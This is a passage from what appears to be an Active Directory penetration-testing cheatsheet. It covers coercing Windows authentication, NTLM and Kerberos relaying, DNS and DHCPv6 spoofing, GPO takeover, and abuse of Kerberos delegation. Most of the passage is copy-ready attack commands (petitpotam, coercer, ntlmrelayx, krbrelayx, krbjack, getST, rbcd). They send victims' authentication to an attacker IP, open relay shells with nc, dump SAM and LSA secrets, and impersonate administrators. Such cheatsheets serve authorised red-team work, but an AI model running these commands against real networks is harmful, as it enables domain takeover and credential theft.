nxc smb &lt;target&gt; -u user1 -p password -M slinky -o CLEANUP=True
nxc smb &lt;target&gt; -u user1 -p password -M scuffy -o CLEANUP=True
</code></pre>
<h4 id="bkmrk-mitm6">MITM6</h4>
<p id="bkmrk-spoof-dhcpv6-respons">Spoof DHCPv6 responses to provide evil DNS config. Usefull to combine with NTLM or Kerberos Relay attacks. Here for an NTLM relay:</p>
<pre id="bkmrk-mitm6--i-interface_t"><code class="language-bash">mitm6 -i interface_to_use -d domain.local -hw target.domain.local -v
</code></pre>
<p id="bkmrk-here-for-a-kerberos-">Here for a Kerberos relay to ADCS:</p>
<pre id="bkmrk-mitm6--i-interface_t-0"><code class="language-bash">mitm6 -i interface_to_use -d domain.local -hw target.domain.local --relay CA.domain.local -v
</code></pre>
<h4 id="bkmrk-petitpotam-%2F-printer">PetitPotam / PrinterBug / ShadowCoerce / DFSCoerce / CheeseOunce</h4>
<p id="bkmrk-exploits-to-coerce-n">Exploits to coerce Net-NTLM authentication from a computer. <strong>PetitPotam</strong> can be used without any credentials if no patch has been installed.</p>
<pre id="bkmrk-%23petitpotam-.%2Fpetitp"><code class="language-bash">#PetitPotam
./petitpotam.py -u user1 -p password -d domain.local -pipe all &lt;attacker_IP&gt; &lt;target_IP&gt;

#PrinterBug
./dementor.py -u user1 -p password -d domain.local &lt;attacker_IP&gt; &lt;target_IP&gt;

#ShadowCoerce
./shadowcoerce.py -u user1 -p password -d domain.local &lt;attacker_IP&gt; &lt;target_IP&gt;

#DFSCoerce
./dfscoerce.py -u user1 -d domain.local &lt;listener_IP&gt; &lt;target_IP&gt;

#CheeseOunce via MS-EVEN
./cheese.py domain.local/user1:password@&lt;target&gt; &lt;listener_IP&gt;
</code></pre>
<h4 id="bkmrk-multi-coerce">Multi coerce</h4>
<p id="bkmrk-try-all-the-techniqu">Try all the techniques above in one command with <a href="https://github.com/p0dalirius/Coercer">this</a>.</p>
<pre id="bkmrk-coercer.py-coerce--u"><code class="language-bash">coercer.py coerce -u user1 -p password -d domain.local -t &lt;target_IP&gt; -l &lt;attacker_IP&gt; -v
</code></pre>
<h4 id="bkmrk-privexchange">PrivExchange</h4>
<p id="bkmrk-coerce-exchange-serv">Coerce Exchange server authentication via <strong>PushSubscription</strong> (now patched):</p>
<pre id="bkmrk-python3-privexchange"><code class="language-bash">python3 privexchange.py -ah &lt;attacker_IP&gt; &lt;Exchange_server&gt; -u user1 -p password -d domain.local
</code></pre>
<h4 id="bkmrk-mssql-server">MSSQL Server</h4>
<p id="bkmrk-with-xp_dirtree.">With <a href="https://hideandsec.sh/active-directory-python.md#rbcd-from-mssql-server">xp_dirtree</a>.</p>
<h4 id="bkmrk-webclient-service">WebClient Service</h4>
<p id="bkmrk-if-this-service-runs">If this service runs on the target machine, a SMB authentication can be switched into an HTTP authentication (really useful for NTLM relay).</p>
<p id="bkmrk-check-if-webclient-i">Check if WebClient is running on machines:</p>
<pre id="bkmrk-webclientservicescan"><code class="language-bash">webclientservicescanner domain.local/user1:password@&lt;IP_range&gt;
</code></pre>
<p id="bkmrk-if-yes%2C-coerce-the-a">If yes, coerce the authentication to the port 80 on the attacker IP. To bypass trust zone restriction, the attacker machine must be specified with a valid <strong>NETBIOS name</strong> and not its IP. The <strong>NETBIOS name</strong> can be obtained with Responder in Analyze mode, or by adding a DNS record in the ADIDNS.</p>
<pre id="bkmrk-%23responder-technique"><code class="language-bash">#Responder technique
responder -I interface_to_use -A

#ADIDNS technique
python3 dnstool.py -u "domain.local\user1" -p "password" -a add -r "attacker.domain.local" -d &lt;attacker_IP&gt; &lt;DNS_IP&gt;

#Coerce with PetitPotam for example
./petitpotam.py -u user1 -p password -d domain.local -pipe all "attacker_NETBIOS@80/test.txt" &lt;target_IP&gt;
</code></pre>
<p id="bkmrk-otherwise%2C-it%27s-poss">Otherwise, it's possible to force an HTTP authentication with a LLMNR poisoning <a href="https://www.synacktiv.com/publications/taking-the-relaying-capabilities-of-multicast-poisoning-to-the-next-level-tricking">by changing the error code returned</a>.</p>
<pre id="bkmrk-%23with-responder-%2B-sm"><code class="language-bash">#With Responder + smbserver 
  #Start smbserver in a first terminal with authentication required
python3 smbserver.py $NAME . -smb2support -username notexist -password notexist
  #Start Responder in a second terminal
responder --interface "eth0"

#Or only with Responder
responder --interface "eth0" -E
</code></pre>
<h3 id="bkmrk-ntlm-and-kerberos-re">NTLM and Kerberos relay</h3>
<h4 id="bkmrk-smb-without-signing">SMB without signing</h4>
<p id="bkmrk-create-a-list-of-com">Create a list of computer without SMB signing:</p>
<pre id="bkmrk-nxc-smb-%3Cip_range%3E--"><code class="language-bash">nxc smb &lt;IP_range&gt; --gen-relay-list list.txt
</code></pre>
<h4 id="bkmrk-ntlmrelayx">ntlmrelayx</h4>
<p id="bkmrk-if-only-smbv2-is-sup">If only SMBv2 is supported, <code>-smb2support</code> can be used. To attempt the remove the MIC if <strong>NTLMv2</strong> is vulnerable to <strong>CVE-2019-1040</strong>, <code>--remove-mic</code> can be used.</p>
<p id="bkmrk-multiple-targets-can">Multiple targets can be specified with <code>-tf list.txt</code>.</p>
<ul id="bkmrk-enumeration"><li>Enumeration</li>
</ul><pre id="bkmrk-%23with-attempt-to-dum"><code class="language-bash">#With attempt to dump possible GMSA and LAPS passwords, and ADCS templates
ntlmrelayx.py -t ldap://dc --dump-adcs --dump-laps --dump-gmsa --no-da --no-acl
</code></pre>
<ul id="bkmrk-socks"><li>SOCKS</li>
</ul><pre id="bkmrk-ntlmrelayx.py--t-smb"><code class="language-bash">ntlmrelayx.py -t smb://target -socks
ntlmrelayx.py -t mssql://target -socks
ntlmrelayx.py -t ldaps://target -socks
</code></pre>
<ul id="bkmrk-creds-dump"><li>Creds dump</li>
</ul><pre id="bkmrk-ntlmrelayx.py--t-smb-0"><code class="language-bash">ntlmrelayx.py -t smb://target
</code></pre>
<ul id="bkmrk-dcsync-if-the-target"><li>DCSync if the target in vulnerable to Zerologon</li>
</ul><pre id="bkmrk-ntlmrelayx.py--t-dcs"><code class="language-bash">ntlmrelayx.py -t dcsync://dc
</code></pre>
<ul id="bkmrk-privesc"><li>Privesc</li>
</ul><p id="bkmrk-add-an-user-to-enter">Add an user to <strong>Enterprise Admins</strong>.</p>
<pre id="bkmrk-ntlmrelayx.py--t-lda"><code class="language-bash">ntlmrelayx.py -t ldap://dc --escalate-user user1 --no-dump
</code></pre>
<ul id="bkmrk-create-a-computer-ac"><li>Create a computer account</li>
</ul><pre id="bkmrk-%23create-a-new-comput"><code class="language-bash">#Create a new computer account through LDAPS
ntlmrelayx.py -t ldaps://dc_IP --add-computer --no-dump --no-da --no-acl

#Create a new computer account through LDAP with StartTLS
ntlmrelayx.py -t ldap://dc_IP --add-computer --no-dump --no-da --no-acl

#Create a new computer account through SMB through the SAMR named pipe (https://github.com/SecureAuthCorp/impacket/pull/1290)
ntlmrelayx.py -t smb://dc_IP --smb-add-computer EVILPC
</code></pre>
<ul id="bkmrk-kerberos-delegation"><li>Kerberos Delegation</li>
</ul><p id="bkmrk-kerberos-rbcd-are-de">Kerberos RBCD are detailled in the following section.</p>
<pre id="bkmrk-%23create-a-new-comput-0"><code class="language-bash">#Create a new computer account through LDAPS and enabled RBCD
ntlmrelayx.py -t ldaps://dc_IP --add-computer --delegate-access --no-dump --no-da --no-acl

#Create a new computer account through LDAP with StartTLS and enabled RBCD
ntlmrelayx.py -t ldap://dc_IP --add-computer --delegate-access --no-dump --no-da --no-acl

#Doesn't create a new computer account and use an existing one
ntlmrelayx.py -t ldap://dc_IP --escalate-user &lt;controlled_computer&gt; --delegate-access --no-dump --no-da --no-acl
</code></pre>
<ul id="bkmrk-shadow-credentials"><li>Shadow Credentials</li>
</ul><pre id="bkmrk-ntlmrelayx.py--t-lda-0"><code class="language-bash">ntlmrelayx.py -t ldap://dc02 --shadow-credentials --shadow-target 'dc01$'
</code></pre>
<ul id="bkmrk-from-a-mitm6-authent"><li>From a mitm6 authent</li>
</ul><pre id="bkmrk-%23attempts-to-open-a-"><code class="language-bash">#Attempts to open a socks and write loot likes dumps into a file
ntlmrelayx.py -tf targets.txt -wh attacker.domain.local -6 -l loot.txt -socks
</code></pre>
<ul id="bkmrk-targeting-gpo"><li>Targeting GPO</li>
</ul><p id="bkmrk-attack-gpo-from-an-u">Attack GPO from an unauthenticated point of view (by intercepting a NTLM authentication) cannot be performed only through LDAP, since the Group Policy Template needs to be modified via SMB. Read this <a href="https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more">article</a> to better understand.</p>
<p id="bkmrk-first%2C-use-ntlmrelay">First, use ntlmrelayx to obtain full rights on the GPC via LDAP for a controlled account (or create a new one)</p>
<pre id="bkmrk-ntlmrelayx--t-ldaps%3A"><code class="language-bash">ntlmrelayx -t ldaps://&lt;DC_IP&gt; -wh '&lt;attacker_IP&gt;:8080' --http-port '80,8080' -i

#When relay is successful, use nc to obtain a LDAP shell
nc 127.0.0.1 11000
add_computer ATTACKER Password123
write_gpo_dacl ATTACKER$ {&lt;GPO_ID&gt;}
</code></pre>
<p id="bkmrk-then%2C-modify-the-gpo">Then, modify the GPO with the controlled account</p>
<pre id="bkmrk-python3-gpoddity.py-"><code class="language-bash">python3 gpoddity.py --gpo-id '&lt;GPO_ID&gt;' --domain 'domain.local' --username 'ATTACKER$' --password 'Password123' --command '&lt;command_to_execute&gt;' --rogue-smbserver-ip '&lt;attacker_IP&gt;' --rogue-smbserver-share 'evil'
</code></pre>
<ul id="bkmrk-relay-to-winrms"><li>Relay to WinRMs</li>
</ul><p id="bkmrk-if-ntlmv1-is-enabled">If <strong>NTLMv1 is enabled</strong> on the source server and accepted by the target, and the target server exposes the WinRMs service (over HTTPS), without forcing CBT. Use this <a href="https://github.com/fortra/impacket/pull/1947">PR</a>.</p>
<pre id="bkmrk-%23perform-the-relay-n"><code class="language-bash">#Perform the relay
ntlmrelayx -t winrms://target.domain.local -smb2support

#Use the opened WinRMs shell
nc 127.0.0.1 11000
</code></pre>
<ul id="bkmrk-adcs-esc8-%26-11-sccm-"><li>
<a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory-certificate-services#bkmrk-relay-attacks---esc8">ADCS ESC8 &amp; 11</a>
</li>
<li>
<a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory-python-edition#bkmrk-sccm-%2F-mecm">SCCM primary site takeover</a>
</li>
</ul><h4 id="bkmrk-krbrelayx">krbrelayx</h4>
<ul id="bkmrk-to-relay-authenticat"><li>To relay authentication from a mitm6 DNS spoofing to ADCS:</li>
</ul><pre id="bkmrk-krbrelayx.py---targe"><code class="language-bash">krbrelayx.py --target http://CA.domain.local/certsrv -ip &lt;attacker_IP&gt; --victim target$ --adcs --template Machine
</code></pre>
<ul id="bkmrk-kerberos-relay-over-"><li>Kerberos relay over SMB</li>
</ul><p id="bkmrk-all-explains-here.">All explains <a href="https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx">here</a>.</p>
<p id="bkmrk-first%2C-register-the-">First, register the specific DNS record:</p>
<pre id="bkmrk-dnstool.py--u-%22domai"><code class="language-bash">dnstool.py -u "domain\\user1" -p "password" -r "$ADCS_NETBIOS1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" -d "attacker_IP" --action add "DC_IP" --tcp
</code></pre>
<p id="bkmrk-then%2C-coerce-the-tar">Then, coerce the target to the registered record, with PetitPotam for example, and relay:</p>
<pre id="bkmrk-petitpotam.py--d-dom"><code class="language-bash">Petitpotam.py -d domain.local -u user1 -p password "&lt;ADCS_netbios&gt;1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" dc.domain.local

krbrelayx.py -t 'http://&lt;ADCS_netbios&gt;.domain.local/certsrv/certfnsh.asp' --adcs --template DomainController -v 'dc$'
</code></pre>
<ul id="bkmrk-kerberos-relay-to-un"><li>Kerberos relay to unsigned SMB</li>
</ul><p id="bkmrk-if-the-relayed-authe">If the relayed authentication is privileged, this will dump the SAM and LSA:</p>
<pre id="bkmrk-krbrelayx.py--t-smb%3A"><code class="language-bash">krbrelayx.py -t smb://target.domain.local
</code></pre>
<ul id="bkmrk-kerberos-relay-from-"><li>Kerberos relay from multicast poisoning</li>
</ul><p id="bkmrk-when-a-web-server-re">When a web server requests Kerberos authentication, it does not use the destination URL to determine the SPN for which an ST is to be retrieved, but rather the response name of the DNS response. Nominally, these two elements should coincide. The client accesses a login URL, performs the DNS query for the server's FQDN, then performs the ST request from the DNS response, and constructs the <code>AP-REQ</code>. Explains <a href="https://www.synacktiv.com/publications/abusing-multicast-poisoning-for-pre-authenticated-kerberos-relay-over-http-with">here</a>.</p>
<pre id="bkmrk-%23responder-with--n-t"><code class="language-bash">#Responder with -N to spoof the answer name returned by LLMNR responses
#&lt;target_netbios&gt; is the server that will receive the relay, for example the PKI
responder -I eth0 -N &lt;target_netbios&gt;

#Krbrelayx to actually perform the Kerberos relay, for example to the PKI
krbrelayx.py --target 'http://CA/certsrv/' -ip &lt;attacker_IP&gt; --adcs --template User
</code></pre>
<h4 id="bkmrk-krbjack">krbjack</h4>
<p id="bkmrk-a-tool-to-perform-dn">A <a href="https://github.com/almandin/krbjack">tool</a> to perform DNS updates thanks to the <code>ZONE_UPDATE_UNSECURE</code> flag in the DNS configuration. Perform a MiTM between any client and a target machine by changing its DNS resolution, forward all the packets to the specified ports, and steal the <code>AP_REQ</code> packets on the fly to reuse them.</p>
<p id="bkmrk-the-port-list-is-rea">The port list is really <strong>important</strong> and must match all the open ports on the target to perform all thge forward. If not, a DOS will occure since clients will not be able to reach the services.</p>
<ul id="bkmrk-mitm-and-exec-an-exe"><li>MiTM and exec an executable on the target (SMB signing must be not required)</li>
</ul><pre id="bkmrk-krbjack---target-nam"><code class="language-bash">krbjack --target-name &lt;target&gt; --domain domain.local --dc-ip &lt;DC_IP&gt; --ports &lt;port1,port2,port3,...&gt; --executable &lt;executable.exe&gt;
</code></pre>
<ul id="bkmrk-just-perform-dns-poi"><li>Just perform DNS poisoning <strong>without</strong> port forwarding and use the MiTM with ntlmrelayx. Be careful with the DOS risk</li>
</ul><pre id="bkmrk-krbjack---target-nam-0"><code class="language-bash">krbjack --target-name &lt;target&gt; --domain domain.local --dc-ip &lt;DC_IP&gt;
ntlmrelayx.py -t &lt;target_IP&gt; -smb2support
</code></pre>
<h2 id="bkmrk-kerberos-delegations">Kerberos Delegations</h2>
<p id="bkmrk-kerberos-delegations-0">Kerberos delegations can be used for local privesc, lateral movement or domain privesc. The main purpose of Kerberos delegations is to permit a principal to access a service on behalf of another principal.</p>
<p id="bkmrk-there-are-two-main-t">There are two main types of delegation:</p>
<ul id="bkmrk-unconstrained-delega"><li>
<strong>Unconstrained Delegation</strong>: the first hop server can request access to any service on any computer</li>
<li>
<strong>Constrained Delegation</strong>: the first hop server has a list of service it can request</li>
</ul><h3 id="bkmrk-unconstrained-delega-0">Unconstrained delegation</h3>
<ul id="bkmrk-a-user-request-a-tgt"><li>A user request a TGT to the DC</li>
<li>The user requests a ST for a service on a computer which is in Unconstrained Delegation</li>
<li>The DC places user's TGT inside ST. When presented to the server with unconstrained delegation, the TGT is extracted from ST and stored in <strong>LSASS</strong>. This way the server can reuse the user's TGT to access any other resource as the user</li>
<li>This behavior can be abused by extracting the TGT from the previous users stored in LSASS</li>
</ul><h4 id="bkmrk-enumerate-principals">Enumerate principals with Unconstrained Delegation</h4>
<p id="bkmrk-works-for-computers-">Works for computers and users</p>
<pre id="bkmrk-finddelegation.py--d"><code class="language-bash">findDelegation.py -dc-ip &lt;DC_IP&gt; domain.local/user1:password

#For another domain across trust
findDelegation.py -target-domain &lt;target_domain&gt; domain.local/user1:password
</code></pre>
<h4 id="bkmrk-unconstrained-delega-1">Unconstrained Delegation attack</h4>
<p id="bkmrk-if-we-have-enough-ri">If we have enough rights against a principal (computer or user) in UD to add a <strong>SPN</strong> on it and <strong>know its password</strong>, we can try to use it to retrieve a machine account password from an authentication coercion.</p>
<ul id="bkmrk-add-a-new-dns-record"><li>Add a new DNS record on the domain that point to our IP</li>
<li>Add a SPN on the principal that point to the DNS record and change its password (will be usefull for the tool <code>krbrelayx.py</code> to extract the TGT from the ST)</li>
<li>Trigger the authentication and grab the ST (and TGT in it) on <strong>krbrelayx</strong> that is listenning for it</li>
</ul><p id="bkmrk-since-the-principal-">Since the principal is in <strong>Unconstrained Delegation</strong>, when the machine account will send the <strong>ST</strong> to the SPN it will automatically add a <strong>TGT</strong> in it, and because the SPN is pointing to us with the DNS record, we can retrieve the ST, decipher the ciphered part with the user password (the SPN is setup on the user, so the ST is ciphered with his password), and retrieve the TGT.</p>
<pre id="bkmrk-%23add-the-spn-python3"><code class="language-bash">#Add the SPN
python3 addspn.py -u 'domain.local\user1' -p 'password' -s 'HOST/attacker.domain.local' -t 'target.domain.local' --additional &lt;DC_IP&gt;

#Create the DNS record
python3 dnstool.py -u 'domain.local\user1' -p 'password' -r 'attacker.domain.local' -d '&lt;attacker_IP&gt;' --action add &lt;DC_IP&gt;

#Run krbrelayx with the hash of the password of the principal
python3 krbrelayx.py -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE -dc-ip dc.domain.local

#Trigger the coercion
./petitpotam.py -u user1 -p password -d domain.local -pipe all "attacker.domain.local" &lt;target_IP&gt;
</code></pre>
<h3 id="bkmrk-constrained-delegati">Constrained delegation</h3>
<p id="bkmrk-in-this-situation%2C-t">In this situation, the computer in delegation has a list of services where it can delegate an authentication. This is controlled by <code>msDS-AllowedToDelegateTo</code> attribute that contains a list of SPNs to which the user tokens can be forwarded. No ticket is stored in LSASS.</p>
<p id="bkmrk-to-impersonate-the-u">To impersonate the user, Service for User (S4U) extension is used which provides two extensions:</p>
<ul id="bkmrk-service-for-user-to-"><li>Service for User to Self (<strong>S4U2self</strong>) - Allows a service to obtain a forwardable ST to itself on behalf of a user with just the user principal name without supplying a password. The service account must have the <strong>TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION</strong> – T2A4D UserAccountControl attribute.</li>
<li>Service for User to Proxy (<strong>S4U2proxy</strong>) - Allows a service to obtain a ST to a second service on behalf of a user.</li>
</ul><h4 id="bkmrk-enumerate-users-and-">Enumerate users and computers with CD enabled</h4>
<pre id="bkmrk-finddelegation.py--d-0"><code class="language-bash">findDelegation.py -dc-ip &lt;DC_IP&gt; domain.local/user1:password

#For another domain across trust
findDelegation.py -target-domain &lt;target_domain&gt; domain.local/user1:password
</code></pre>
<h4 id="bkmrk-with-protocol-transi">With protocol transition</h4>
<p id="bkmrk-any-service-can-be-s">Any service can be specified on the target since it is not correctly checked.</p>
<pre id="bkmrk-getst.py--spn-%27cifs%2F"><code class="language-bash">getST.py -spn 'cifs/target.domain.local' -impersonate administrator -hashes ':&lt;computer_NThash&gt;' -dc-ip &lt;DC_IP&gt; domain.local/computer
export KRB5CCNAME=./Administrator.ccache
</code></pre>
<h4 id="bkmrk-without-protocol-tra">Without protocol transition</h4>
<p id="bkmrk-in-this-case%2C-it-is-">In this case, it is not possible to use <strong>S4U2self</strong> to obtain a forwardable ST for a specific user. This restriction can be bypassed with an RBCD attack detailled in the following section.</p>
<h3 id="bkmrk-resource-based-const">Resource-based constrained delegation</h3>
<p id="bkmrk-wagging-the-dog"><a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html">Wagging the Dog</a></p>
<p id="bkmrk-with-rbcd%2C-this-is-t">With RBCD, this is the resource machine (the machine that receives delegation) which has a list of services that can delegate to it. This list is specified in the attribute <code>msds-allowedtoactonbehalfofotheridentity</code> and the computer can modified its own attribute (really usefull in NTLM relay attack scenario).</p>
<h4 id="bkmrk-requirements">Requirements</h4>
<ul id="bkmrk-the-dc-has-to-be-at-"><li>The DC has to be at least a <strong>Windows Server 2012</strong>
</li>
<li>Write rights on the target machine (<strong>GenericAll, GenericWrite, AllExtendedRights</strong>)</li>
<li>Target computer object must not have the attribute <code>msds-allowedtoactonbehalfofotheridentity</code> set</li>
</ul><h4 id="bkmrk-enumerate-users-and--0">Enumerate users and computers with RBCD enabled</h4>
<pre id="bkmrk-finddelegation.py--d-1"><code class="language-bash">findDelegation.py -dc-ip &lt;DC_IP&gt; domain.local/user1:password

#For another domain across trust
findDelegation.py -target-domain &lt;target_domain&gt; domain.local/user1:password

#Check the attribute on an account
rbcd.py -action read -delegate-to ServiceB$ domain.local/user1:password
</code></pre>
<h4 id="bkmrk-standard-rbcd">Standard RBCD</h4>
<p id="bkmrk-the-attaker-has-comp">The attaker has compromised ServiceA and want to compromise ServiceB. Additionnally he has sufficient rights to configure <code>msds-allowedtoactonbehalfofotheridentity</code> on ServiceB.</p>
<pre id="bkmrk-%23add-rbcd-from-servi"><code class="language-bash">#Add RBCD from ServiceA to ServiceB
rbcd.py -action write -delegate-from ServiceA$ -delegate-to ServiceB$ domain.local/user1:password

#Verify property
rbcd.py -action read -delegate-to ServiceB$ domain.local/user1:password

#Get ServiceA TGT and then S4U
getST.py -spn 'cifs/serviceB.domain.local' -impersonate administrator -hashes ':&lt;ServiceA_NThash&gt;' -dc-ip &lt;DC_IP&gt; domain.local/ServiceA$
export KRB5CCNAME=./Administrator.ccache
</code></pre>
<h4 id="bkmrk-with-machine-account">With machine account creation</h4>
<ul id="bkmrk-domain-users-can-cre"><li>Domain users can create some machines, <code>ms-ds-machineaccountquota</code> must not being to 0</li>
<li>Add a fake machine account in the domain</li>
<li>Add it the to <code>msds-allowedtoactonbehalfofotheridentity</code> attribute of the target machine</li>
</ul><pre id="bkmrk-addcomputer.py--comp"><code class="language-bash">addcomputer.py -computer-name 'ControlledComputer$' -computer-pass 'ComputerPassword' -domain-netbios domain.local 'domain.local/user1:password'
rbcd.py -action write -delegate-from ControlledComputer$ -delegate-to ServiceB$ domain.local/ControlledComputer$:ComputerPassword
</code></pre>
<ul id="bkmrk-use-the-s4uself-func"><li>Use the <strong>S4USelf</strong> function with the fake machine (on an arbitrary SPN) to create a forwardable ticket for a wanted user (not <strong>protected</strong>)</li>
<li>Use the <strong>S4UProxy</strong> function to obtain a ST for the impersonated user for the wanted service on the target machine</li>
</ul><pre id="bkmrk-getst.py--spn-%27cifs%2F-0"><code class="language-bash">getST.py -spn 'cifs/serviceB.domain.local' -impersonate administrator -dc-ip &lt;DC_IP&gt; domain.local/ControlledComputer$:ComputerPassword
export KRB5CCNAME=./Administrator.ccache
</code></pre>
<h4 id="bkmrk-skip-s4uself">Skip S4USelf</h4>
<ul id="bkmrk-attacker-has-comprom"><li>Attacker has compromised Service A, has sufficient ACLs against Service B to configure RBCD, and wants to attack Service B</li>
<li>By social engineering or any other solution, an interesting victim authenticates to Service A with a ST</li>
<li>Attacker dumps the ST on Service A (<code>sekurlsa::tickets</code>)</li>
<li>Attacker configures RBCD from Service A to Service B as above</li>
<li>Attacker performs S4UProxy and bypass S4USelf by providing the ST as evidence</li>
</ul><p id="bkmrk-not-tested-in-my-lab"><strong>NOT TESTED IN MY LAB WITH IMPACKET</strong></p>
<pre id="bkmrk-getst.py--spn-%27cifs%2F-1"><code class="language-bash">getST.py -spn 'cifs/serviceB.domain.local' -additional-ticket ./ticket.ccache -hashes ':&lt;ServiceA_NThash&gt;' -dc-ip &lt;DC_IP&gt; domain.local/ServiceA$
</code></pre>
<h4 id="bkmrk-reflective-rbcd">Reflective RBCD</h4>
<p id="bkmrk-with-a-tgt-or-the-ha">With a TGT or the hash of a service account, an attacker can configure a RBCD from the service to itself, and run a full S4U to access to access the machine on behalf of another user.</p>
<pre id="bkmrk-rbcd.py--action-writ"><code class="language-bash">rbcd.py -action write -delegate-from ServiceA$ -delegate-to ServiceA$ -k -no-pass domain.local/ServiceA$
getST.py -spn 'cifs/serviceA.domain.local' -impersonate administrator -k -no-pass -dc-ip &lt;DC_IP&gt; domain.local/ServiceA$
</code></pre>
<h4 id="bkmrk-impersonate-protecte">Impersonate protected user via S4USelf request</h4>
<p id="bkmrk-it-is-possible-to-im">It is possible to impersonate a <strong>protected user</strong> with the <strong>S4USelf</strong> request if we have a TGT (or the creds) of the target machine (for example from an <strong>Unconstrained Delegation</strong>).</p>
<p id="bkmrk-with-the-target-tgt-">With the target TGT it is possible to realise a S4USelf request for any user and obtain a ST for the service. In case where the needed user is protected against delegation, S4USelf will still work, but the ST is not forwardable (so no S4UProxy possible) and the specified SPN is invalid...however, the SPN is not in the encrypted part of the ticket. So it is possible to modify the SPN and retrieve a valid ST for the target service with a sensitive user (and the ST PAC is well signed by the KDC).</p>
<pre id="bkmrk-getst.py--self--alts"><code class="language-bash">getST.py -self -altservice 'cifs/serviceA.domain.local' -impersonate administrator -k -no-pass -dc-ip &lt;DC_IP&gt; domain.local/ServiceA$
</code></pre>
<h4 id="bkmrk-bypass-constrained-d">Bypass Constrained Delegation restrictions with RBCD</h4>
<ul id="bkmrk-attacker-compromises"><li>Attacker compromises <strong>ServiceA</strong> and <strong>ServiceB</strong>
</li>
<li>ServiceB is allowed to delegate to <code>time/ServiceC</code> (the target) without protocol transition (no S4USelf)</li>
<li>Attacker configures RBCD from ServiceA to ServiceB and performs a full S4U attack to obtain a forwardable ST for the Administrator to ServiceB</li>
<li>Attacker reuses this forwardable ST as evidence to realise a S4UProxy attack from ServiceB to <code>time/ServiceC</code>
</li>
<li>Since the service is not protected in the obtained ticket, the attacker can change the ST from the previous S4UProxy execution to <code>cifs/ServiceC</code>
</li>
</ul><pre id="bkmrk-%23rbcd-from-a-to-b-rb"><code class="language-bash">#RBCD from A to B
rbcd.py -action write -delegate-from ServiceA$ -delegate-to ServiceB$ -hashes ':&lt;ServiceA_NThash&gt;' domain.local/ServiceA$
getST.py -spn 'cifs/serviceB.domain.local' -impersonate administrator -hashes ':&lt;ServiceA_NThash&gt;' -dc-ip &lt;DC_IP&gt; domain.local/ServiceA$

#S4UProxy from B to C with the obtained ST as evidence
getST.py -spn 'cifs/serviceC.domain.local' -additional-ticket ./administrator.ccache -hashes ':&lt;ServiceB_NThash&gt;' -dc-ip &lt;DC_IP&gt; domain.local/ServiceB$
</code></pre>
<h4 id="bkmrk-u2u-rbcd-with-spn-le">U2U RBCD with SPN-less accounts</h4>
<p id="bkmrk-in-case-where-you-ha-0">In case where you have sufficient rights to configure an RBCD on a machine (for example with an unsigned authentication coerce via HTTP) but <code>ms-ds-machineaccountquota</code> equals 0, there is no ADCS with the HTTP endpoint and the Shadow Credentials attack is not possible (domain level to 2012 for example), you can realize a RBCD from a SPN-less user account. An interesting example is present <a href="https://twitter.com/snovvcrash/status/1595814518558543874">here</a>.</p>
<ul id="bkmrk-configure-the-machin"><li>Configure the machine account to trust the user account you control (NTLM Relay, with the machine account's creds,...)</li>
<li>Obtain a TGT for the user via pass-the-hash and extract the session key from it with this <a href="https://github.com/SecureAuthCorp/impacket/pull/1201">PR</a>:</li>
</ul><pre id="bkmrk-gettgt.py--hashes-%3A%24"><code class="language-bash">getTGT.py -hashes :$(pypykatz crypto nt 'password') 'domain.local'/'user1'
describeTicket.py 'user1.ccache' | grep 'Ticket Session Key'
</code></pre>
<ul id="bkmrk-now%2C-change-the-user"><li>Now, change the user's long term key (his RC4 NT hash actually) to be equal to the TGT session key. The ST sent in the S4UProxy will be encrypted with the session key, but the KDC will try to decipher it with the user's long term key, this is why the LT key must be equal to the session key (<strong>WARNING !!! The user's password is now equal to an unknown value, you have to use a sacrificial account to realise this attack</strong>). Everything is explained <a href="https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html">here</a>.</li>
</ul><pre id="bkmrk-smbpasswd.py--newhas"><code class="language-bash">smbpasswd.py -newhashes :sessionKey 'domain.local'/'user1':'password'@'DC'
</code></pre>
<ul id="bkmrk-realize-the-s4uself-"><li>Realize the S4USelf request with a U2U request. If U2U is not used, the KDC cannot find the account's LT key when a UPN is specified instead of a SPN. Then, use the ticket obtained in the U2U S4USelf request (ciphered with the session key), to perform a S4UProxy request. Use this <a href="https://github.com/SecureAuthCorp/impacket/pull/1202">PR</a> to do it:</li>
</ul><pre id="bkmrk-krb5ccname%3D%27user1.cc"><code class="language-bash">KRB5CCNAME='user1.ccache'
getST.py -k -no-pass -u2u -impersonate "Administrator" -spn "cifs/target.domain.local" 'domain.local'/'user1'
</code></pre>
<ul id="bkmrk-finally%2C-use-the-obt"><li>Finally, use the obtained ST to dump the machine LSA and SAM registers with <code>secretsdump</code>.</li>
</ul><h4 id="bkmrk-rbcd-from-mssql-serv">RBCD from MSSQL server</h4>
<p id="bkmrk-if-we-have-sufficien">If we have sufficient access to a MSSQL server we can use the <code>xp_dirtree</code> in order to leak the Net-NTLM hash of the machine account. Additionally, the <strong>Web Service</strong> client must be running on the machine in order to trick the authentication from SMB to HTTP and avoid the NTLM signature (authentication must be sent to <code>@80</code>):</p>
<ul id="bkmrk-create-a-dns-record-"><li>Create a DNS record in order to be able to leak the NTLM hash externally</li>
<li>Use the <code>xp_dirtree</code> (or <code>xp_fileexist</code>) function to the created DNS record on <code>@80</code>. This will force the authentication and leak the hash</li>
<li>Relay the machine hash to the LDAP server to add a controlled account (<strong>with a SPN</strong> for the further S4USelf request) to the <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> of the target machine</li>
<li>Now we can ask a ST for a user we want to impersonate for a service on the machine</li>
</ul><pre id="bkmrk-%23add-the-dns-python3"><code class="language-bash">#Add the DNS
python3 dnstool.py -u 'domain.local\user1' -p 'password' -r 'attacker.domain.local' -d '&lt;attacker_IP&gt;' --action add &lt;DC_IP&gt;

#On our machine, waiting for the leak
#https://gist.github.com/3xocyte/4ea8e15332e5008581febdb502d0139c
python rbcd_relay.py 192.168.24.10 domain.local 'target$' &lt;controlledAccountWithASPN&gt;

#ON the MSSQL server
